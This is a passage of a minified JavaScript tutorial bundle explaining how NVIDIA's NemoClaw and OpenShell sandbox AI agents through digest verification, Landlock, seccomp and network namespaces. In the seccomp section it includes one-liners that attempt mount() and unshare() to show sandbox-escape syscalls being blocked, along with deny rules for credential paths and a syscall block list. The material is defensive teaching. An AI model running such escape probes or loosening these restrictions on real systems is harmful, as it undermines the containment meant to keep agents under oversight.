  digest: "sha256:a3f8c1d4e5b6a7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1"`,language:"yaml"},{title:"Compute the actual digest",content:"NemoClaw reads the entire blueprint package from disk and computes its SHA-256 hash. This includes all Python source files, configuration templates, and metadata.",code:`# Equivalent to what NemoClaw does internally
sha256sum /var/lib/nemoclaw/blueprints/0.8.2.tar.gz
# a3f8c1d4e5b6a7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1`,language:"bash"},{title:"Compare and decide",content:"If the digests match, execution proceeds normally. If they do not match, NemoClaw refuses to execute and reports a verification failure. There is no override flag, no --force, no way to skip this check."}]}),e.jsx(t,{title:"Verification in action",language:"bash",code:`$ nemoclaw apply
Resolving blueprint... v0.8.2 (cached)
Verifying blueprint integrity...
  Expected: sha256:a3f8c1d4e5b6...
  Computed: sha256:a3f8c1d4e5b6...
  Result:   PASS

Planning sandbox configuration...
# ... continues normally

$ # Now simulate a tampered blueprint
$ nemoclaw apply
Resolving blueprint... v0.8.2 (cached)
Verifying blueprint integrity...
  Expected: sha256:a3f8c1d4e5b6...
  Computed: sha256:7b2e4f9a1c3d...
  Result:   FAIL

FATAL: Blueprint integrity check failed.
The cached blueprint does not match the expected digest.
This may indicate a corrupted download or a supply chain attack.

Actions:
  1. Run 'nemoclaw blueprint purge 0.8.2' to clear the cache
  2. Run 'nemoclaw blueprint fetch 0.8.2' to re-download
  3. If the mismatch persists, report to your security team`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"No Override by Design"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["A deliberate design choice in NemoClaw is that there is no flag to skip digest verification. Other tools sometimes provide ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"--skip-verify"})," or",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"--no-check"})," flags for convenience during development. NemoClaw does not. The reasoning is straightforward: if you can skip verification during development, you can accidentally ship a CI pipeline that skips verification in production. The inconvenience of always verifying is the point."]}),e.jsxs(n,{type:"tip",title:"Local Development Workflow",children:["For local development of custom blueprints, use"," ",e.jsx("code",{children:"nemoclaw blueprint dev ./my-blueprint"})," which loads a blueprint from a local directory instead of the registry. In dev mode, the digest is computed fresh on every apply (since the files are changing), but the verification mechanism is still active -- it just verifies against a locally computed manifest rather than a registry manifest."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Defense in Depth"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Digest verification is one layer of defense. NemoClaw also employs:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"TLS pinning"})," for registry communication -- prevents man-in-the-middle attacks during blueprint download"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Minimal dependency surface"})," -- the blueprint has few external Python dependencies, reducing the attack surface"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Signed releases"})," -- major versions are signed with NVIDIA's GPG key, providing an additional verification path independent of the registry"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Audit logging"})," -- every blueprint resolution, verification, and application is logged with timestamps and digests, creating a forensic trail"]})]}),e.jsx(r,{question:"Why does NemoClaw refuse to provide a --skip-verify flag for digest verification?",options:["It would make the codebase more complex to maintain","If skipping is possible during development, it can accidentally be left on in production, undermining the entire security model","The verification is so fast that skipping it would not save any time","NVIDIA licensing requires verification to be mandatory"],correctIndex:1,explanation:"The core design principle is that security mechanisms should not have convenience bypasses. If a --skip-verify flag existed, it would inevitably appear in CI scripts, developer dotfiles, and deployment configurations. The small inconvenience of always-on verification prevents a large class of accidental security regressions."}),e.jsx(s,{references:[{title:"NemoClaw Supply Chain Security",url:"https://docs.nvidia.com/nemoclaw/security/supply-chain",type:"docs",description:"Official documentation on immutable blueprints, digest verification, and signed releases."},{title:"SLSA Framework",url:"https://slsa.dev/",type:"docs",description:"Supply chain Levels for Software Artifacts -- the industry framework that influenced NemoClaw's design."}]})]})}const D=Object.freeze(Object.defineProperty({__proto__:null,default:u},Symbol.toStringTag,{value:"Module"}));function g(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"What Is OpenShell?"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NVIDIA OpenShell is the sandbox runtime that NemoClaw uses to isolate autonomous agents. It is part of the broader NVIDIA Agent Toolkit and provides kernel-level isolation using Linux Security Modules (LSMs), seccomp filters, and network namespaces. If NemoClaw is the brain that decides what the sandbox should look like, OpenShell is the hands that build and enforce it."}),e.jsx(a,{term:"OpenShell",definition:"A lightweight sandbox runtime developed by NVIDIA that provides container-like isolation without requiring a container runtime. It uses Landlock LSM for filesystem access control, seccomp-bpf for syscall filtering, and Linux network namespaces for network isolation. OpenShell is designed specifically for isolating AI agent workloads.",example:"openshell create --name my-sandbox --policy ./sandbox-policy.yaml",seeAlso:["Landlock LSM","seccomp-bpf","Network Namespace","NVIDIA Agent Toolkit"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Container-Like, But Different"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Developers familiar with Docker or Podman will find OpenShell conceptually similar but architecturally different. Containers use kernel namespaces (PID, mount, network, user) combined with cgroups to create isolated environments. OpenShell uses a different approach: it relies primarily on ",e.jsx("strong",{children:"LSM enforcement"})," (Landlock) rather than mount namespaces for filesystem isolation. This gives it some distinct advantages and trade-offs."]}),e.jsx(i,{title:"OpenShell vs. Traditional Containers",headers:["Aspect","Docker/Podman","OpenShell"],rows:[["Filesystem isolation","Mount namespace (overlay FS)","Landlock LSM (kernel-level ACLs)"],["Syscall filtering","seccomp (optional)","seccomp (always on)"],["Network isolation","Network namespace + veth","Network namespace + gateway bridge"],["Root required","Rootless mode available but complex","No root required (unprivileged Landlock)"],["Image required","Yes (OCI image)","No (uses host filesystem with restrictions)"],["Startup time","~500ms-2s","~50-200ms"],["Overhead","Moderate (overlay FS, cgroups)","Minimal (LSM hooks only)"],["Use case","General workloads","AI agent isolation"]],highlightDiffs:!0}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Three Pillars of OpenShell Isolation"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"OpenShell's security model rests on three enforcement mechanisms, each operating at the kernel level:"}),e.jsx(c,{title:"OpenShell Isolation Layers",components:[{name:"Landlock LSM",description:"Filesystem access control",color:"blue"},{name:"seccomp-bpf",description:"Syscall filtering",color:"green"},{name:"Network Namespace",description:"Network isolation",color:"purple"}],connections:[{from:"Landlock LSM",to:"seccomp-bpf",label:"defense in depth"},{from:"seccomp-bpf",to:"Network Namespace",label:"defense in depth"}]}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Landlock LSM"})," -- Controls which files and directories the sandboxed process can read, write, and execute. Unlike traditional Unix permissions, Landlock rules are enforced at the kernel level and cannot be bypassed by the process, even if it somehow gains root inside the sandbox. Landlock rules are applied per-process and inherited by child processes."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"seccomp-bpf"})," -- Filters which system calls the sandboxed process can make. This prevents privilege escalation attacks that rely on dangerous syscalls like ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"ptrace"}),",",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"mount"}),", or",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"reboot"}),". The filter is compiled into BPF bytecode and loaded into the kernel, making it extremely fast."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Network Namespaces"})," -- Gives the sandbox its own network stack completely isolated from the host. The sandbox cannot see or interact with the host's network interfaces. The only network access available is through the OpenShell gateway, which forwards approved traffic according to policy."]})]}),e.jsxs(n,{type:"info",title:"LSM Enforcement vs. Container Isolation",children:["A key insight is that Landlock operates at the ",e.jsx("em",{children:"system call"})," level, not at the filesystem level. When a process inside a Landlock sandbox calls"," ",e.jsx("code",{children:'open("/etc/passwd", O_RDONLY)'}),", the kernel's LSM hook checks the Landlock ruleset before granting access. There is no separate filesystem layer, no overlay, no copy-on-write. The process sees the real host filesystem but can only access what the rules allow. This is faster and simpler than container overlay filesystems, but it means the sandbox shares the host's filesystem content (read-only paths show the host's actual files)."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Why Not Just Use Containers?"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw could have been built on Docker or another OCI runtime, but OpenShell was chosen for several reasons specific to the AI agent use case:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"No image management"})," -- agents need access to the user's project files. With containers, this requires bind mounts, volume configuration, and careful UID mapping. OpenShell just restricts access to the existing filesystem."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Sub-second startup"})," -- agents may start and stop sandboxes frequently during a session. Container startup (even rootless) takes 500ms-2s. OpenShell sandboxes start in 50-200ms."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"No daemon"})," -- Docker requires dockerd; Podman is daemonless but still requires conmon. OpenShell is a single process with no background daemon."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Unprivileged by default"})," -- Landlock is available to unprivileged processes on kernels 5.13+. No root, no setuid, no capabilities needed."]})]}),e.jsxs(o,{title:"Kernel Version Requirement",children:["OpenShell requires Linux kernel 5.13 or later for Landlock support. For full functionality (including Landlock ABI v3 with network port restrictions), kernel 6.2 or later is recommended. Run"," ",e.jsx("code",{children:"uname -r"})," to check your kernel version. macOS and Windows are not supported -- OpenShell is Linux-only by design."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"OpenShell in the NemoClaw Stack"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:`OpenShell is a dependency of the NemoClaw blueprint, not something users install or manage separately. When the blueprint's Apply stage runs, it calls OpenShell's API to create and configure the sandbox. The blueprint translates high-level policy declarations (like "allow network access to pypi.org") into low-level OpenShell configuration (Landlock rules, seccomp filters, network namespace rules).`}),e.jsx(t,{title:"Checking OpenShell availability",language:"bash",code:`# Verify OpenShell is installed and the kernel supports it
$ openshell check
OpenShell v1.4.0
  Landlock: supported (ABI v4, kernel 6.8.0)
  seccomp:  supported (bpf, kernel 6.8.0)
  netns:    supported
  Status:   ready

# If Landlock is not supported:
$ openshell check
OpenShell v1.4.0
  Landlock: NOT SUPPORTED (kernel 5.10 < 5.13 required)
  seccomp:  supported
  netns:    supported
  Status:   degraded (filesystem isolation unavailable)`}),e.jsxs(n,{type:"tip",title:"Quick Orientation",children:["You rarely interact with OpenShell directly. NemoClaw's blueprint handles all OpenShell calls. The main exception is the"," ",e.jsx("code",{children:"openshell term"})," command, which opens a TUI for monitoring sandbox activity. Think of OpenShell as the engine inside the car -- NemoClaw is the driver."]}),e.jsx(s,{references:[{title:"NVIDIA OpenShell Documentation",url:"https://docs.nvidia.com/openshell/",type:"docs",description:"Official documentation for the OpenShell sandbox runtime."},{title:"NVIDIA Agent Toolkit",url:"https://developer.nvidia.com/agent-toolkit",type:"docs",description:"The broader toolkit that includes OpenShell, NemoClaw, and other agent infrastructure."},{title:"Landlock LSM Kernel Documentation",url:"https://docs.kernel.org/userspace-api/landlock.html",type:"docs",description:"Linux kernel documentation for the Landlock security module."}]})]})}const q=Object.freeze(Object.defineProperty({__proto__:null,default:g},Symbol.toStringTag,{value:"Module"}));function y(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Landlock Enforcement"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Landlock is a Linux Security Module (LSM) that allows unprivileged processes to restrict their own filesystem access. In OpenShell, Landlock is the primary mechanism for controlling what an agent can read, write, and execute on the filesystem. Unlike traditional Unix permissions (which are user-based), Landlock rules are process-based and cannot be removed once applied -- even by root."}),e.jsx(a,{term:"Landlock LSM",definition:"A stackable Linux Security Module introduced in kernel 5.13 that enables unprivileged access control. A process can create a Landlock ruleset defining which filesystem operations are allowed on which paths, then restrict itself to that ruleset. Once self-restricted, the process and all its descendants are permanently bound by those rules for the lifetime of the process.",example:"A sandboxed agent can be restricted to read-write /sandbox and /tmp, read-only /usr and /lib, and no access to /home, /root, or /etc/shadow.",seeAlso:["LSM","seccomp","Mandatory Access Control"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"How Landlock Works in OpenShell"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When the NemoClaw blueprint applies a sandbox configuration, it translates the user's policy declarations into a Landlock ruleset. OpenShell then applies this ruleset to the sandboxed process using a sequence of kernel calls:"}),e.jsxs("ol",{className:"list-decimal list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:["Create a new Landlock ruleset with ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"landlock_create_ruleset()"})]}),e.jsxs("li",{children:["Add path rules for each allowed filesystem path using ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"landlock_add_rule()"})]}),e.jsxs("li",{children:["Enforce the ruleset on the current process using ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"landlock_restrict_self()"})]}),e.jsx("li",{children:"Fork the agent process, which inherits the restrictions"})]}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["After step 3, the restrictions are permanent. There is no"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"landlock_unrestrict_self()"})," -- that system call does not exist and never will. This is by design: security restrictions that can be removed by the restricted process are not real restrictions."]}),e.jsx(t,{title:"Landlock ruleset creation (C, simplified)",language:"bash",code:`// Conceptual C code showing the kernel API OpenShell uses

// Step 1: Create a ruleset that handles filesystem access
struct landlock_ruleset_attr attr = {
    .handled_access_fs =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_MAKE_REG |
        LANDLOCK_ACCESS_FS_EXECUTE
};
int ruleset_fd = landlock_create_ruleset(&attr, sizeof(attr), 0);

// Step 2: Allow read-write on /sandbox
struct landlock_path_beneath_attr sandbox_rule = {
    .allowed_access =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_MAKE_REG,
    .parent_fd = open("/sandbox", O_PATH)
};
landlock_add_rule(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH, &sandbox_rule, 0);

// Step 2b: Allow read-only on /usr
struct landlock_path_beneath_attr usr_rule = {
    .allowed_access =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_EXECUTE,
    .parent_fd = open("/usr", O_PATH)
};
landlock_add_rule(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH, &usr_rule, 0);

// Step 3: Enforce -- no going back after this
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
landlock_restrict_self(ruleset_fd, 0);

// Step 4: Fork the agent -- child inherits all restrictions
pid_t agent_pid = fork();`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Default Filesystem Permissions"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["OpenShell's default Landlock policy provides a carefully designed set of filesystem permissions. The guiding principle is ",e.jsx("strong",{children:"least privilege"}),": grant only what the agent needs to function, deny everything else."]}),e.jsx(i,{title:"Default Filesystem Access Rules",headers:["Path","Access Level","Rationale"],rows:[["/sandbox","Read-Write","Agent working directory -- where project files are mounted and work is done"],["/tmp","Read-Write","Temporary files -- many tools and libraries require /tmp"],["/usr","Read-Only + Execute","System binaries and libraries -- agent needs to run tools like python, git, node"],["/lib","Read-Only + Execute","Shared libraries -- required for dynamically linked binaries"],["/lib64","Read-Only + Execute","x86_64 shared libraries -- symlinked on many distributions"],["/proc/self","Read-Only","Process info -- some runtimes need /proc/self/exe and /proc/self/maps"],["/dev/null","Read-Write","Null device -- required by many programs"],["/dev/urandom","Read-Only","Random number generation -- required by cryptographic libraries"],["/home","Denied","User home directories -- never accessible to the agent"],["/root","Denied","Root home directory -- never accessible to the agent"],["/etc","Denied (with exceptions)","System config -- /etc/resolv.conf and /etc/ssl/certs are read-only"]]}),e.jsx(d,{title:"OpenShell Landlock Policy (YAML)",policy:`# Default OpenShell Landlock filesystem policy
# Applied by NemoClaw blueprint during sandbox creation

filesystem:
  rules:
    - path: /sandbox
      access: [read, write, create, delete]
      comment: "Agent working directory"

    - path: /tmp
      access: [read, write, create, delete]
      comment: "Temporary files"

    - path: /usr
      access: [read, execute]
      comment: "System binaries and libraries"

    - path: /lib
      access: [read, execute]
      comment: "Shared libraries"

    - path: /proc/self
      access: [read]
      comment: "Process self-info"

    - path: /etc/resolv.conf
      access: [read]
      comment: "DNS configuration"

    - path: /etc/ssl/certs
      access: [read]
      comment: "TLS certificates"

  # Everything not listed above is DENIED
  default: deny`,annotations:[{line:7,text:"/sandbox is the only directory where the agent can create and modify files. Project files are bind-mounted here."},{line:11,text:"/tmp is needed by Python, Node.js, and many other runtimes for temporary file creation."},{line:15,text:"Execute permission on /usr allows running installed tools. Write is denied -- the agent cannot install system packages."},{line:27,text:"Read-only /etc/resolv.conf is required for DNS resolution inside the sandbox."},{line:33,text:"The default-deny policy means any path not explicitly listed is completely inaccessible."}]}),e.jsxs(o,{title:"No Write Access to System Paths",children:["The agent cannot write to ",e.jsx("code",{children:"/usr"}),", ",e.jsx("code",{children:"/lib"}),", or any system path. This means"," ",e.jsx("code",{children:"apt install"}),", ",e.jsx("code",{children:"pip install --system"}),", and similar commands will fail inside the sandbox. Agent dependencies must be pre-installed in the sandbox image or installed to ",e.jsx("code",{children:"/sandbox/.local"})," using user-level installers like ",e.jsx("code",{children:"pip install --user"}),"."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Landlock ABI Versions"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Landlock has evolved across kernel versions. Each ABI version adds new capabilities:"}),e.jsx(i,{title:"Landlock ABI Versions",headers:["ABI Version","Kernel","Added Capabilities"],rows:[["v1","5.13+","Basic filesystem access control (read, write, execute, create, delete)"],["v2","5.19+","File referring/linking/renaming restrictions"],["v3","6.2+","Network port binding and connection restrictions (TCP)"],["v4","6.7+","IOCTL restrictions on files"]]}),e.jsx(n,{type:"info",title:"Graceful Degradation",children:"OpenShell detects the available Landlock ABI version at startup and adjusts its enforcement accordingly. On a kernel with ABI v1, filesystem rules work but network port restrictions are enforced through the network namespace alone (which is less granular). OpenShell will warn you if critical features are unavailable due to kernel version."}),e.jsx(r,{question:"What happens if a sandboxed agent tries to read /home/user/.ssh/id_rsa?",options:["The read succeeds because the file exists on the host filesystem","The read returns an empty file","The kernel returns EACCES (Permission Denied) because /home is not in the Landlock ruleset","OpenShell intercepts the read and returns a fake file"],correctIndex:2,explanation:"Landlock enforcement happens at the kernel level. When the agent calls open() on a path not covered by any rule in the ruleset, the kernel's LSM hook denies the operation with EACCES. The process never sees the file's contents -- the denial happens before any data is read. There is no interception or fakery; it is a hard kernel-level denial."}),e.jsx(s,{references:[{title:"Landlock Kernel Documentation",url:"https://docs.kernel.org/userspace-api/landlock.html",type:"docs",description:"Official Linux kernel documentation for the Landlock security module."},{title:"OpenShell Filesystem Policies",url:"https://docs.nvidia.com/openshell/filesystem",type:"docs",description:"How OpenShell translates YAML policies into Landlock rulesets."}]})]})}const B=Object.freeze(Object.defineProperty({__proto__:null,default:y},Symbol.toStringTag,{value:"Module"}));function x(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Seccomp Filters"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["While Landlock controls ",e.jsx("em",{children:"which files"})," a process can access, seccomp controls ",e.jsx("em",{children:"which system calls"})," a process can make. Together they form a two-layer defense: even if an attacker finds a way to trick Landlock, seccomp can block the dangerous kernel operations needed to exploit that trick. OpenShell uses seccomp-bpf (seccomp with Berkeley Packet Filter programs) to filter syscalls for every sandboxed agent process."]}),e.jsx(a,{term:"seccomp-bpf",definition:"Secure Computing mode with BPF (Berkeley Packet Filter) is a Linux kernel feature that allows a process to install a filter program that examines every system call the process makes. The filter can allow, deny, log, or kill based on the syscall number and its arguments. Once installed, the filter cannot be removed and applies to all child processes.",example:"A seccomp filter that allows read(), write(), and open() but kills the process on execve() -- preventing execution of arbitrary binaries.",seeAlso:["BPF","Landlock","Privilege Escalation","Syscall"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"How Seccomp Works in OpenShell"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"OpenShell compiles a seccomp filter from the NemoClaw policy configuration and loads it into the kernel before launching the agent process. The filter is a BPF program -- essentially a small, efficient virtual machine program that runs inside the kernel for every syscall. This makes the per-syscall overhead negligible (typically under 100 nanoseconds)."}),e.jsx(t,{title:"Seccomp filter loading (conceptual)",language:"python",code:`# Simplified view of what OpenShell does internally

import ctypes

# Define the BPF filter program
# Each instruction checks the syscall number
filter_program = compile_seccomp_policy({
    "default_action": "SCMP_ACT_ERRNO",   # deny by default (return EPERM)
    "syscalls": [
        # File I/O
        {"names": ["read", "write", "open", "openat", "close"],
         "action": "SCMP_ACT_ALLOW"},
        # Memory management
        {"names": ["mmap", "mprotect", "munmap", "brk"],
         "action": "SCMP_ACT_ALLOW"},
        # Process management (limited)
        {"names": ["fork", "clone", "wait4", "exit_group"],
         "action": "SCMP_ACT_ALLOW"},
        # Networking (through gateway only)
        {"names": ["socket", "connect", "sendto", "recvfrom"],
         "action": "SCMP_ACT_ALLOW"},
        # Dangerous syscalls -- explicitly blocked
        {"names": ["ptrace", "mount", "reboot", "kexec_load"],
         "action": "SCMP_ACT_KILL"},
    ]
})

# Load the filter -- no going back
prctl(PR_SET_NO_NEW_PRIVS)
seccomp(SECCOMP_SET_MODE_FILTER, filter_program)`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Allowed vs. Blocked Syscalls"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"OpenShell's default seccomp profile allows approximately 60 of the 340+ available Linux system calls. The allowed set is carefully chosen to support typical agent workloads (running Python, Node.js, shell scripts, git) while blocking syscalls that could be used for privilege escalation or sandbox escape."}),e.jsx(i,{title:"Syscall Categories",headers:["Category","Examples","Action"],rows:[["File I/O","read, write, open, openat, close, stat, fstat, lstat, lseek","Allow"],["Memory","mmap, mprotect, munmap, brk, mremap","Allow"],["Process (basic)","fork, clone (restricted flags), wait4, exit_group, getpid","Allow"],["Time","clock_gettime, gettimeofday, nanosleep","Allow"],["Signals","rt_sigaction, rt_sigprocmask, kill (self only)","Allow"],["Networking","socket, connect, bind, sendto, recvfrom, select, poll, epoll_*","Allow"],["Directory","getdents64, mkdir, rmdir, rename, unlink","Allow"],["Process tracing","ptrace","Kill"],["Mounting","mount, umount2, pivot_root","Kill"],["Module loading","init_module, finit_module, delete_module","Kill"],["System control","reboot, kexec_load, swapon, swapoff","Kill"],["Namespace manipulation","unshare, setns (most flags)","Deny (EPERM)"],["Raw I/O","iopl, ioperm","Kill"],["Kernel keyring","add_key, request_key, keyctl","Deny (EPERM)"]],highlightDiffs:!0}),e.jsxs(n,{type:"info",title:"Allow vs. Deny vs. Kill",children:[e.jsx("p",{children:"OpenShell uses three seccomp actions:"}),e.jsxs("ul",{className:"list-disc list-inside mt-2 space-y-1",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Allow"})," -- the syscall proceeds normally"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Deny (ERRNO)"})," -- the syscall returns an error (EPERM) but the process continues. Used for syscalls that programs might attempt harmlessly."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Kill"})," -- the process is immediately terminated. Used for syscalls that have no legitimate use in a sandbox and indicate an active attack."]})]})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Preventing Privilege Escalation"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The primary purpose of seccomp in OpenShell is preventing privilege escalation. Even if an attacker finds a vulnerability in the agent's code or a library, the seccomp filter limits what they can do with it. Key defenses include:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"No ptrace"})," -- an attacker cannot attach to other processes to read their memory (which could contain credentials in the blueprint process). The ptrace syscall is killed immediately."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"No mount"})," -- an attacker cannot mount a new filesystem to bypass Landlock restrictions. Mounting requires the mount syscall, which is killed."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"No namespace manipulation"})," -- an attacker cannot create new user or mount namespaces to escape the sandbox. The unshare and setns syscalls are denied for most flag combinations."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Restricted clone flags"})," -- the clone syscall (used by fork) is allowed, but only with safe flags. Flags like CLONE_NEWUSER (create new user namespace) are denied."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"PR_SET_NO_NEW_PRIVS"})," -- before the seccomp filter is loaded, OpenShell sets the no-new-privileges bit. This ensures that execve() cannot gain additional privileges through setuid/setgid binaries."]})]}),e.jsx(t,{title:"Demonstrating seccomp enforcement",language:"bash",code:`# Inside the sandbox: allowed syscalls work normally
$ python3 -c "print('hello')"
hello

$ ls /sandbox
project_files/  .local/

# Attempting a blocked syscall
$ python3 -c "import ctypes; ctypes.CDLL(None).mount(b'none', b'/mnt', b'tmpfs', 0, None)"
Killed  # Process immediately terminated -- mount is a kill-action syscall

# Attempting a denied (but not kill) syscall
$ python3 -c "import ctypes; ctypes.CDLL(None).unshare(0x10000000)"
OSError: [Errno 1] Operation not permitted  # EPERM -- process continues

# Checking the seccomp status from inside
$ cat /proc/self/status | grep Seccomp
Seccomp:        2
Seccomp_filters:        1
# Seccomp: 2 means SECCOMP_MODE_FILTER (BPF filter active)`}),e.jsx(o,{title:"Seccomp Filters Are Permanent",children:"Like Landlock rules, seccomp filters cannot be removed once applied. They are inherited by all child processes. There is no way for the sandboxed process (or any process it spawns) to lift the restrictions. Even if an attacker gains root capabilities inside the sandbox, the seccomp filter remains in effect because of the no-new-privileges bit."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Custom Seccomp Profiles"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["NemoClaw allows operators to customize the seccomp profile through policy files. This is useful when an agent needs syscalls that the default profile blocks. For example, an agent that works with performance profiling might need",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"perf_event_open"}),"."]}),e.jsx(t,{title:"Custom seccomp policy additions",language:"yaml",code:`# .nemoclaw/policies/seccomp-custom.yaml
seccomp:
  # Start from the default profile
  extends: default

  # Add specific syscalls
  allow:
    - perf_event_open    # Needed for profiling agent
    - inotify_init1      # Needed for file watching

  # Override action for specific syscalls (change from kill to deny)
  override:
    - name: ptrace
      action: deny       # Log and deny instead of kill (for debugging)`}),e.jsx(r,{question:"Why does OpenShell use 'kill' action for mount() but 'deny' (EPERM) for unshare()?",options:["mount is more dangerous than unshare","mount() should never be called by legitimate agent code, so calling it indicates an attack. unshare() might be called harmlessly by some runtimes that can recover from EPERM.","Kill action is faster than deny action","It is a historical accident from an earlier version"],correctIndex:1,explanation:"The choice between kill and deny depends on whether legitimate software might accidentally call the syscall. Some language runtimes and libraries probe for namespace support by calling unshare() and handling the error gracefully. Killing the process for such a probe would break legitimate code. In contrast, no legitimate agent code should ever call mount(), so any attempt is treated as hostile."}),e.jsx(s,{references:[{title:"seccomp-bpf Kernel Documentation",url:"https://docs.kernel.org/userspace-api/seccomp_filter.html",type:"docs",description:"Linux kernel documentation for seccomp with BPF filters."},{title:"OpenShell Seccomp Profiles",url:"https://docs.nvidia.com/openshell/seccomp",type:"docs",description:"Default and custom seccomp profiles in OpenShell."}]})]})}const F=Object.freeze(Object.defineProperty({__proto__:null,default:x},Symbol.toStringTag,{value:"Module"}));function f(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Network Namespaces"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The third pillar of OpenShell isolation is network namespaces. While Landlock controls filesystem access and seccomp controls syscalls, network namespaces control network access. A sandboxed agent gets its own complete network stack -- its own interfaces, routing table, iptables rules, and DNS resolver -- completely separate from the host's network."}),e.jsx(a,{term:"Network Namespace",definition:"A Linux kernel 